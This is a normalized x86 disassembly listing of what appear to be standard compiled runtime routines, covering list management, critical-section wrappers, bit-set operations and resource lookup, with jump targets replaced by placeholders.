mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407e18
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_413894
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_4040c8
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4138d8
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_413e40
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_413c88
sub_413930
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_413de4
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_413970
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_413930
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_413994
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_404534
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41670c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_413a08
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41620c
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
sub_413a18
push ebx
call sub_405e10
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405e10
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_413c88
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov ebx eax
call sub_405e10
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov ebx eax
call sub_405e10
mov [ eax + 0xc ] ebx
sub_413a70
push ebx
push esi
push edi
call sub_405e10
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413de4
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_413aa0
push ebx
push esi
call sub_405e10
mov eax [ eax + 0x8 ]
call sub_4032a0
call sub_405e10
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_413ecc
mov esi eax
call sub_405e10
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_413cd4
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405e10
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_4032a0
sub_413afc
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_413b92
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413b99
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_40322c
call sub_413afc
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031f0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4042d8
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_4050c0
call sub_405110
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_413994
or bl al
sub_413ba4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_413c52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_413c33
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4031e8
call sub_413afc
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413a18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413c3a
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413a70
retn
call sub_413aa0
sub_413c68
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_413c88
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413cd4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413d70
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028c8
mov edx esi
mov eax ebx
call sub_413de4
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413d38
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_413d34
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
jmp sub_403a2c
sub_413d70
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_413db8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405ba4
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413d38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413dbf
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_413de4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413d70
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_413e0c
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_413fa0
retn
sub_413e40
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_413e60
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413d70
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028c8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413ed8
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413d70
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_413de4
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_413cd4
xor ecx ecx
mov edx esi
mov eax ebx
call sub_413e60
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_413f30
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413d70
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413f80
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_413e40
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413cd4
sub_413fa0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413d70
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_40270c
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_413fdc
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413d70
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_413fa0
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402cbc
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_413cd4
dec ebp
inc edi
jne r-xdata
sub_41404c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor esi esi
mov edx edi
mov eax ebx
call sub_413e40
test eax eax
jl r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov esi edi
mov edx [ ebx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 4 ] ecx
mov edx eax
mov eax ebx
call sub_413cd4
mov cl 0x1
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41408c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403270
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4140e0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40362c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4141e4
xor eax eax
push ebp
push sub_414142
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4032a0
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403290
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414149
mov eax [ ebp - 0x4 ]
call sub_414248
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_41415c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4141e4
xor eax eax
push ebp
push sub_4141d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413c88
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413e40
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4141df
mov eax [ ebp - 0x4 ]
call sub_414248
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_413d70
sub_4141f8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4141e4
xor eax eax
push ebp
push sub_41423b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413f80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414242
mov eax [ ebp - 0x4 ]
call sub_414248
retn
sub_414254
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4142a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4142a8
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_414284
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026cc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402cbc
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026ec
mov edx edi
mov eax ebp
call sub_41429c
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028c8
sub_41434c
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_414284
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_4142a8
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_414390
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_414408
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
call sub_416eac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_414448
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4144fe
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40410c
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031f0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4042d8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031f0
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414505
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_414524
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4145b9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031f0
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_4042d8
mov eax ebx
mov si 0xffff
call sub_40349c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4145c0
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax ebx
mov si 0xffff
call sub_40349c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_40349c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4043f4
sub_4145cb
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4034f4
mov eax ebx
mov si 0xffff
call sub_40349c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_40349c
push eax
lea eax [ ebx + 0x4 ]
call sub_4056e0
mov ecx eax
mov edx r-xdata
pop eax
call sub_403354
sub_414616
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414648
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414668
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403354
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_414690
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_4056e0
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_40349c
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax edi
call sub_4056e0
mov edx eax
mov eax esi
call sub_414690
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_4056e0
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_414728
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_41477d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4056e0
mov edx eax
mov eax edi
call sub_414690
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414784
lea eax [ ebp - 0x4 ]
call sub_4056e0
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_41478c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4147c4
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414408
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4147f4
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_414830
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4031f0
mov edx esp
mov eax esi
call sub_4042d8
add esp 0x100
pop esi
pop ebx
retn
sub_414858
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4148ed
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_4031f0
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_4042d8
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_40349c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_414818
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408dbc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4148f4
lea eax [ ebp - 0x14 ]
call sub_404074
retn
sub_414910
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_414a70
mov edx ebx
mov eax esi
call sub_414a08
sub_414940
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_414818
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_413ed8
mov dl 0x1
mov eax ebx
call sub_4147f4
sub_414970
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4149a0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4149fa
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_413ecc
call sub_4032a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_414a08
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_40342c
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_413c88
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_414990
xor ecx ecx
mov edx esi
mov eax ebx
call sub_414728
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_413d70
sub_414a70
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_413ecc
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_413f80
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_413cd4
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_414728
mov eax ebx
call sub_414990
pop edi
pop esi
pop ebx
retn
sub_414ac4
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41561c
mov edx ebx
